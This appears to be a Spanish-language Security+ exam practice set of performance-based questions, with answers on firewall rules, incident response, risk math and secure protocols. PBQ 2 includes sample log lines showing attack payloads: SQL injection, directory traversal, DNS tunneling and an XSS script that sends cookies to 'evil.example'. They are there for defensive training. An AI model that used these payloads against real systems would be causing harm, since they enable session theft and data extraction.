# PBQs: preguntas basadas en desempeño

En el examen real las PBQs aparecen al principio y suelen ser interactivas: arrastrar y soltar, completar tablas de firewall, elegir opciones en una topología o clasificar logs. Acá están en formato texto para practicar el razonamiento.

Consejo: si una PBQ te traba en el examen, marcála (flag), seguí con las de opción múltiple y volvé al final.

---

## PBQ 1: Reglas de firewall

Tu empresa tiene esta red:

- LAN interna: `10.0.10.0/24`
- DMZ con el servidor web `172.16.1.10`
- Servidor de correo en la DMZ: `172.16.1.20`
- El firewall procesa las reglas de arriba hacia abajo y aplica la primera que coincide.

Requisitos:

1. Cualquiera en Internet puede acceder al sitio web sólo por HTTPS.
2. Internet puede enviar correo al servidor de correo.
3. La LAN puede administrar el servidor web por SSH. Nadie más.
4. Todo lo demás se bloquea.

Completá la tabla (origen, destino, puerto, protocolo, acción).

| # | Origen | Destino | Puerto | Protocolo | Acción |
| --- | --- | --- | --- | --- | --- |
| 1 | ? | ? | ? | ? | ? |
| 2 | ? | ? | ? | ? | ? |
| 3 | ? | ? | ? | ? | ? |
| 4 | ? | ? | ? | ? | ? |

<details><summary>Ver solución</summary>

| # | Origen | Destino | Puerto | Protocolo | Acción |
| --- | --- | --- | --- | --- | --- |
| 1 | ANY | 172.16.1.10 | 443 | TCP | ALLOW |
| 2 | ANY | 172.16.1.20 | 25 | TCP | ALLOW |
| 3 | 10.0.10.0/24 | 172.16.1.10 | 22 | TCP | ALLOW |
| 4 | ANY | ANY | ANY | ANY | DENY |

Por qué:

- HTTPS es TCP 443. No se abre el 80 porque el requisito dice "sólo por HTTPS".
- SMTP entre servidores es TCP 25 (587/465 se usan para envío autenticado de clientes).
- SSH es TCP 22 y se limita al rango de la LAN, aplicando mínimo privilegio.
- La denegación implícita (deny all) va siempre al final. Si estuviera primera, bloquearía todo.

*Secciones 16: Ports and Protocols, Firewalls y Configuring Firewalls.*
</details>

---

## PBQ 2: Identificar el ataque en los logs

Asociá cada fragmento de log con el ataque correspondiente.

Ataques: **Fuerza bruta**, **Password spraying**, **SQL injection**, **Directory traversal**, **XSS**, **DNS tunneling**.

```text
A) 2026-10-01 02:14:01 FAIL login user=jperez src=203.0.113.5
   2026-10-01 02:14:02 FAIL login user=jperez src=203.0.113.5
   ... (480 intentos más en 3 minutos) ...
   2026-10-01 02:17:12 OK   login user=jperez src=203.0.113.5

B) GET /productos?id=10%20UNION%20SELECT%20username,password%20FROM%20users--

C) GET /buscar?q=<script>document.location='http://evil.example/c?'+document.cookie</script>

D) 2026-10-01 09:00:01 FAIL login user=agarcia  pass_hash=H1 src=198.51.100.7
   2026-10-01 09:00:03 FAIL login user=mlopez   pass_hash=H1 src=198.51.100.7
   2026-10-01 09:00:05 FAIL login user=rsosa    pass_hash=H1 src=198.51.100.7
   ... (300 usuarios distintos, mismo hash de contraseña) ...

E) GET /static/../../../../windows/win.ini

F) query: aGVsbG8gd29ybGQ.x7k2.exfil.example.net  TXT
   query: dGhpcyBpcyBzZWNyZXQ.x7k3.exfil.example.net TXT
   (miles de subdominios largos y aleatorios hacia el mismo dominio)
```

<details><summary>Ver solución</summary>

- **A: Fuerza bruta.** Muchos intentos contra una sola cuenta desde una IP. Mitigación: bloqueo de cuenta, MFA, rate limiting.
- **B: SQL injection.** `UNION SELECT` intenta extraer datos de otra tabla. Mitigación: consultas parametrizadas, WAF.
- **C: XSS.** Script que roba cookies. Mitigación: codificación de salida, validación de entrada, CSP, cookies `HttpOnly`.
- **D: Password spraying.** Una misma contraseña contra muchos usuarios. Mitigación: MFA, detección de patrones en el SIEM, contraseñas fuertes.
- **E: Directory traversal.** `../` para salir del directorio web. Mitigación: validar rutas, ejecutar con mínimo privilegio.
- **F: DNS tunneling / exfiltración.** Datos codificados en Base64 dentro de subdominios. Mitigación: monitoreo y filtrado de DNS, límites de consultas TXT.

*Secciones 17: Password Attacks, 18: SQL and XML Injections y XSS, 19: Directory Traversal y DNS Attacks.*
</details>

---

## PBQ 3: Respuesta a un incidente de ransomware

Un viernes a las 18:00 varios usuarios de contabilidad reportan que sus archivos tienen extensión `.locked` y aparece una nota de rescate. El EDR muestra que el proceso se originó en la laptop `CONT-07` después de abrir un adjunto.

**Parte A.** Ordená estas acciones según el modelo de respuesta a incidentes de CompTIA:

1. Reimagen de los equipos afectados y eliminación de la persistencia.
2. Aislar `CONT-07` y los equipos afectados de la red.
3. Reunión de lecciones aprendidas y actualización del playbook.
4. Confirmar que es un incidente real y determinar su alcance.
5. Restaurar archivos desde backups verificados y monitorear.
6. Validar alertas del EDR y del SIEM que indican cifrado masivo.

**Parte B.** Antes de reimagen, ¿qué deberías capturar de `CONT-07` y en qué orden?

<details><summary>Ver solución</summary>

**Parte A:** 6, 4, 2, 1, 5, 3.

- **Detección (6):** validar las alertas.
- **Análisis (4):** confirmar el incidente, el alcance y el impacto, y notificar a los interesados.
- **Contención (2):** aislar para que no se propague (el EDR puede aislar el equipo de forma remota).
- **Erradicación (1):** eliminar el malware y la persistencia.
- **Recuperación (5):** restaurar desde backups limpios y monitorear.
- **Post-incidente (3):** análisis de causa raíz y lecciones aprendidas.

La preparación (fase 1 del modelo) ya debió hacerse antes: backups offline, playbooks, capacitación.

**Parte B:** seguir el orden de volatilidad.

1. Memoria RAM (procesos, conexiones de red, claves de cifrado que podrían estar en memoria).
2. Estado de red y procesos en ejecución.
3. Imagen forense del disco, con hash para probar integridad.
4. Logs relevantes (EDR, correo, proxy).

Documentar todo con cadena de custodia.

*Sección 24: Incident Response Process y Digital Forensic Procedures.*
</details>

---

## PBQ 4: Análisis cuantitativo de riesgo

Completá la tabla y decidí qué control conviene.

| Activo | Valor | EF | ARO | SLE | ALE |
| --- | ---: | ---: | ---: | ---: | ---: |
| Base de datos de clientes | USD 200.000 | 50% | 0,5 | ? | ? |
| Servidor web | USD 40.000 | 25% | 2 | ? | ? |
| Laptops del equipo de ventas (cada una) | USD 2.000 | 100% | 3 | ? | ? |

Preguntas:

1. ¿Qué activo tiene el ALE más alto?
2. Un control para la base de datos cuesta USD 30.000 por año y baja el ARO a 0,1. ¿Conviene?

<details><summary>Ver solución</summary>

| Activo | SLE (Valor × EF) | ALE (SLE × ARO) |
| --- | ---: | ---: |
| Base de datos | 100.000 | 50.000 |
| Servidor web | 10.000 | 20.000 |
| Laptops (cada una) | 2.000 | 6.000 |

1. La base de datos, con ALE de USD 50.000.
2. Nuevo ALE = 100.000 × 0,1 = 10.000. Ahorro anual = 50.000 − 10.000 = 40.000. El control cuesta 30.000, así que el beneficio neto es de USD 10.000 por año: **conviene**. Si costara más de 40.000 por año, no se justificaría.

*Sección 9: Quantitative Risk Analysis.*
</details>

---

## PBQ 5: Reemplazar protocolos inseguros

Un auditor encontró estos servicios en uso. Para cada uno, indicá el protocolo seguro que lo reemplaza y su puerto.

| Inseguro | Puerto | Reemplazo seguro | Puerto |
| --- | ---: | --- | ---: |
| Telnet | 23 | ? | ? |
| FTP | 21 | ? | ? |
| HTTP | 80 | ? | ? |
| LDAP | 389 | ? | ? |
| POP3 | 110 | ? | ? |
| IMAP | 143 | ? | ? |
| SNMPv1/v2c | 161 | ? | ? |
| Syslog (UDP) | 514 | ? | ? |

<details><summary>Ver solución</summary>

| Inseguro | Puerto | Reemplazo seguro | Puerto |
| --- | ---: | --- | ---: |
| Telnet | 23 | SSH | 22 |
| FTP | 21 | SFTP (sobre SSH) o FTPS | 22 / 990 |
| HTTP | 80 | HTTPS | 443 |
| LDAP | 389 | LDAPS | 636 |
| POP3 | 110 | POP3S | 995 |
| IMAP | 143 | IMAPS | 993 |
| SNMPv1/v2c | 161 | SNMPv3 | 161 |
| Syslog (UDP) | 514 | Syslog sobre TLS | 6514 |

SNMPv3 usa el mismo puerto: lo que cambia es que agrega autenticación y cifrado.

*Secciones 16: Ports and Protocols y 21: Selecting Secure Protocols.*
</details>

---

## PBQ 6: Ubicar controles en la red

Tenés estos controles para ubicar: **WAF**, **NAC con 802.1X**, **IDS pasivo**, **Jump server**, **EDR**, **Proxy forward con filtrado web**, **Balanceador de carga**.

Ubicalos en la ubicación más adecuada:

1. Delante del servidor web público, para bloquear SQLi y XSS.
2. En los switches de acceso donde se conectan los usuarios.
3. Conectado a un puerto SPAN del switch core, para alertar sin afectar el tráfico.
4. En una zona de administración, como único punto para acceder por SSH/RDP a los servidores.
5. En cada laptop y servidor.
6. Entre los usuarios internos e Internet, para bloquear categorías de sitios.
7. Distribuyendo las conexiones entre tres servidores web idénticos.

<details><summary>Ver solución</summary>

1. **WAF.** Inspecciona HTTP/HTTPS en capa 7.
2. **NAC con 802.1X.** Autentica y valida la postura de cada dispositivo antes de darle acceso.
3. **IDS pasivo.** Recibe una copia del tráfico, así que no puede bloquear pero tampoco introduce latencia.
4. **Jump server.** Un único punto controlado y auditado para la administración.
5. **EDR.** Detecta y responde a nivel de endpoint.
6. **Proxy forward con filtrado web.** Controla y registra la navegación saliente.
7. **Balanceador de carga.** Da alta disponibilidad y escalabilidad.

*Secciones 16: Network Appliances, IDS and IPS, Port Security y 21: NAC, Web and DNS Filtering, EDR.*
</details>
